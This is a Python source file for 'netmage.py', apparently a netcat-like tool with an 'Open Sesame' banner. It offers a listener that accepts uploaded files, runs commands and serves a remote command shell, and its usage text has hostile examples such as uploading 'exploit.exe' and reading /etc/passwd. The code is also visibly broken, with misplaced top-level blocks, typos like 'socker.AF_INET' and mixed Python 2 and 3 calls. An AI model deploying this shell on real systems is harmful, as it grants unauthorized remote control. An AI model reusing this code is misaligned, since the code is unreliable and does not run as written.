import os
import sys
import socket
import getopt
import threading
import subprocess
import colorama

from colorama import Fore
print (Fore.MAGENTA + ''' 

 _____  _____  ____  __  __  _____  _____  _____     _____ ___ ___
/  _  \/   __\/    \/  \/  \/  _  \/   __\/   __\   /  _  \\  |  /
|  |  ||   __|\-  -/|  \/  ||  _  ||  |_ ||   __| _ |   __/ |   | 
\__|__/\_____/ |__| \__ \__/\__|__/\_____/\_____/<_>\__/    \___/ 
			   Open Sesame

''')






# define some global variable
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage(): 
	print (Fore.RED + "Usage: netmage.py -t target_host -p port")
	print (Fore.RED + "-l --listen		- listen on [host]:[port] for incoming connections")
	print (Fore.RED + "-e --execute=file_to_run - execute the given file upon receiving a connection")
	print (Fore.RED + "-c --comand 		- initialize a command shell")
	print (Fore.RED + "-u --upload=destination -upon receiving connection upload a file and write to [destination]")
	print ( "Examples:")
	print ( "netmage.py -t 127.0.0.1 -p 8080 -l -c")
	print ( "netmage.py -t 127.0.0.1 -p 8080 -l -u=c:\\exploit.exe")
	print ( "netmage.py -t 127.0.0.1 -p 8080 -l -e1\"cat /etc/passwd\"")
	print ( "echo 'ABCDEFG' | ./netmage.py -t 127.0.0.1 -p 135")
	sys.exit(0)

def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target
	
	if not len(sys.argv[1:]):
		usage()
	# read the commandline options
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ["help","listen","execute","target","port","command","upload"])
	except getopt.GetoptError as err:
		print (str(err))
		usage()


	for o,a in opts:
		if o in ("-h","--help"):
			usage()
		elif o in ("-l","--listen"):
			listen = True
		elif o in ("-e","--execute"):
			execute = a
		elif o in ("-c","--commandshell"):
			command = True
		elif o in ('-u',"--upload"):
			upload_destination = a
		elif o in ("-t","--target"):
			target = a
		elif o in ("-p","--port"):
			port = int(a)
		else:
			assert False,"Unhandled Option"
# are we gonna listen or just send data from stdin?
if not listen and len(target) and port > 0:
	
	#read buffer from command line
	#this will block, so send ctrl D if no sending output
	# to stidin
	buffer = sys.stdin.read()

	# send data off
	client_sender(buffer)

#we are going to listen and potentially
#upload things, execute commands, and drop shell
#depending on our command line options above
if listen:
	server_loop()

def client_sender(buffer):

	client = socket.socket(socker.AF_INET, socket.SOCK_STREAM)

	try :
		# connect to our target host
		client.connect((target,port))

		if len(buffer):
			client.send(buffer)

		while True:

			# now wait for data back
			recv_len = 1
			response = ""

			while recv_len:

				data	= client.recv(4096)
				recv_len = len(data)
				response+= data

				if recv_len < 4096:
					break

			print(response , end=" ")

			#wait for more input
			buffer = raw_input("")
			buffer += "\n"

			# send it off
			client.send(buffer)

	except:

			print (Fore.RED + "[*] Exception!!! Exiting.")

			# close connection
			client.close()
main()

def server_loop():
	global target

	#if no target is defined, listen on all interfaces
	if not len(target):
		target ="0.0.0.0"

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target,port))
	server.listen(5)

	while True:
		client_socket, addr = server.accept()

		# spin off a thread to handle new client
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()


def run_command(command):

	#trim newline
	command = command.rstrip()
	
	#run command and get output
	try:

		output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
	except:
		output = "Failed to execute command.\r\n"

	# send output back to client
	return output

def client_handler(client_socket):
	global upload
	global execute
	global command

	# check for upload
	if len(upload_destination):

		#read in all bytes and write to destination
		file_buffer = " "

		# keep reading data until none available
		while True:
			data = client.socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data
		# now we take bytes and try to write them out
		try :
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			#acknowledge that we wrote the file out
			client_socket.send("Saved file to %s\r\n" % upload_destination)
		except:
			client_socket.send("Failed to save file" % upload_destination)


# check for command execution
if len(execute):

	#run the command
	output = run_command(execute)

	client_socket.send(output)


# now we go into another loop if a command shell was requested
if command:

	while True:
		# show a simple prompt
		client_socket.send("<netmage:#> ")

			# now we receive until we see a linefeed (enter key)
		cmd_buffer = ""
		while "\n" not in cmd_buffer:
			cmd_buffer += client_socket.recv(1024)


		# send back the outut
		response = run_command(cmd_buffer)

		#send response
		client_socket.send(response)
